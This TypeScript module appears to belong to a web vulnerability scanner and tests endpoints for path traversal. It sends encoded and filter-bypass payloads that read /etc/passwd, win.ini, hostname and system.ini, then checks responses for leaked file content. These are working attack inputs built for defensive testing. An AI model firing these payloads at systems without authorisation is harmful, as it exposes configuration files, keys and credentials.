import { ScanContext, ScanFinding, ctxFetch } from "./types";

const TRAVERSAL_PROBES = [
  "../../../etc/passwd",
  "..%2F..%2F..%2Fetc%2Fpasswd",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..\\..\\..\\windows\\win.ini",
  "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
];

const TRAVERSAL_PARAMS = ["file", "path", "filename", "page", "template", "include", "load", "view", "dir", "document"];

const UNIX_INDICATORS = ["root:x:0:0", "/bin/bash", "/bin/sh", "nobody:x:", "daemon:x:"];
const WIN_INDICATORS = ["[extensions]", "[fonts]", "for 16-bit app support"];

export async function runPathTraversalCheck(ctx: ScanContext): Promise<ScanFinding[]> {
  const { targetUrl, emit, discoveredEndpoints, profile } = ctx;
  const findings: ScanFinding[] = [];
  const seen = new Set<string>();

  emit({ type: "engine_start", engine: "Bug-Finder/Traversal", message: "Testing path traversal vectors" });

  const budget = profile === "quick" ? 2 : profile === "standard" ? 5 : 8;
  const endpoints = discoveredEndpoints.slice(0, budget);

  for (const endpoint of endpoints) {
    for (const param of TRAVERSAL_PARAMS.slice(0, profile === "quick" ? 3 : 6)) {
      for (const probe of TRAVERSAL_PROBES.slice(0, profile === "quick" ? 2 : TRAVERSAL_PROBES.length)) {
        const testUrl = `${endpoint}${endpoint.includes("?") ? "&" : "?"}${param}=${probe}`;
        const res = await ctxFetch(ctx, testUrl);
        if (!res) continue;

        const body = await res.text().catch(() => "");
        const bodyLower = body.toLowerCase();

        const unixHit = UNIX_INDICATORS.find(i => bodyLower.includes(i));
        const winHit = WIN_INDICATORS.find(i => bodyLower.includes(i));
        const hit = unixHit ?? winHit;

        if (hit) {
          const isWin = !!winHit;
          const key = `${endpoint}:${param}:traversal`;
          if (seen.has(key)) { break; }

          // Confirmation probe: target a different file to rule out the indicator appearing in static content.
          const confirmProbe = isWin
            ? "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem.ini"
            : "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhostname";
          const confirmUrl = `${endpoint}${endpoint.includes("?") ? "&" : "?"}${param}=${confirmProbe}`;
          const confirmRes = await ctxFetch(ctx, confirmUrl);
          const confirmBody = (await confirmRes?.text().catch(() => "")) ?? "";

          // For Unix: hostname file returns 1-255 bytes with no HTML markup.
          // For Windows: system.ini contains "[mci extensions]" or "[drivers]".
          const confirmHit = isWin
            ? ["[mci extensions]", "[drivers]", "timer=timer.drv"].some(ci => confirmBody.toLowerCase().includes(ci))
            : (confirmBody.length > 1 && confirmBody.length < 256 && !confirmBody.includes("<html") && !confirmBody.includes("{"));

          if (!confirmHit) {
            emit({ type: "log", message: `  Traversal indicator "${hit}" found but confirmation failed at ${endpoint} [${param}] — skipping` });
            break;
          }

          seen.add(key);
          const leakedFile = isWin ? "windows\\win.ini" : "/etc/passwd";
          findings.push({
            title: `Path Traversal — ${isWin ? "win.ini" : "/etc/passwd"} Disclosure`,
            category: "Path Traversal",
            severity: "critical",
            endpoint,
            description: `Parameter "${param}" is vulnerable to path traversal. The server returned contents of ${leakedFile} when the payload "${probe}" was injected. Confirmed with a second distinct payload ("${confirmProbe}") that also returned file content. An attacker can read any file the web process has permission to access, including application config, private keys, and credentials.`,
            evidence: [
              `Probe 1: GET ${testUrl}`,
              `  Payload: ${probe}`,
              `  HTTP ${res.status}`,
              `  File content leaked (${leakedFile}):`,
              `  ${body.slice(0, 400)}`,
              ``,
              `Confirmation: GET ${confirmUrl}`,
              `  Payload: ${confirmProbe}`,
              `  Response (${confirmBody.length} bytes): ${confirmBody.slice(0, 200)}`,
              ``,
              `Detection indicator: "${hit}"`,
            ].join("\n"),
            recommended_fix: "Validate and sanitize all file path parameters. Use a whitelist of allowed filenames. Never concatenate user input into filesystem paths. Use `path.resolve()` and confirm the result starts with your expected base directory.",
            cvss_score: 9.1,
            cwe_id: "CWE-22",
            scanner_name: "Bug-Finder/Traversal",
            scanner_family: "web",
            confidence: 0.97,
          });
          emit({ type: "log", message: `  [PATH TRAVERSAL CONFIRMED] ${leakedFile} + ${isWin ? "system.ini" : "hostname"} both leaked at ${endpoint} param=${param}` });
          break;
        }
      }
    }
  }

  if (findings.length === 0) {
    emit({ type: "log", message: "No path traversal vulnerabilities detected" });
  }

  emit({
    type: "engine_done",
    engine: "Bug-Finder/Traversal",
    message: `Path traversal check complete — ${findings.length} issue(s) found`,
  });

  return findings;
}
